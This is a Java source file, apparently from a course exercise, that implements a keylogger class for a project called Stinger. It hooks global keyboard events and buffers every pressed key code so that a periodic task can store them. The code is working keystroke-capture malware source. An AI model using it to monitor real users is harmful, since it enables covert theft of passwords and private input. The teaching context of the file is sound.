package stinger.os.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import stinger.StingerEnvironment;

import java.util.ArrayList;
import java.util.List;

public class Keylogger implements NativeKeyListener {
    // TODO: IMPLEMENT
    // this class is the keylogger class.
    // the methods bellow will be called when key actions are taken.
    // you need to implement them to save the key actions so we can know what the user does.
    //
    // This works with the KeyloggerStoreTask.run, which runs periodically by Stinger.
    // In it you will take the data you collected in the methods here and save them in the storage.
    //
    // You're free to do whatever as long as it works really. Just try and don't leave the
    // confines of this/KeyloggerStoreTask class.

    private final List<Integer> mKeyCodes;

    public Keylogger(StingerEnvironment environment) {
        mKeyCodes = new ArrayList<>();
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent event) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent event) {
        // This is called because someone pressed a key on the keyboard.
        // Let's save the keycode into the list.
        //
        // The synchronized is necessary to provide data safety when working with multiple threads.
        // but we haven't learned concurrency so its okay if you didn't do this and don't understand why.
        synchronized (mKeyCodes) {
            mKeyCodes.add(event.getKeyCode());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent event) {
    }

    public List<Integer> getKeyCodes() {
        // Make a copy of the original key codes. Clear the list because
        // we don't need it multiple times and return the copy.
        //
        // The synchronized is necessary to provide data safety when working with multiple threads.
        // but we haven't learned concurrency so its okay if you didn't do this and don't understand why.
        synchronized (mKeyCodes) {
            List<Integer> copy = new ArrayList<>(mKeyCodes);
            mKeyCodes.clear();
            return copy;
        }
    }
}
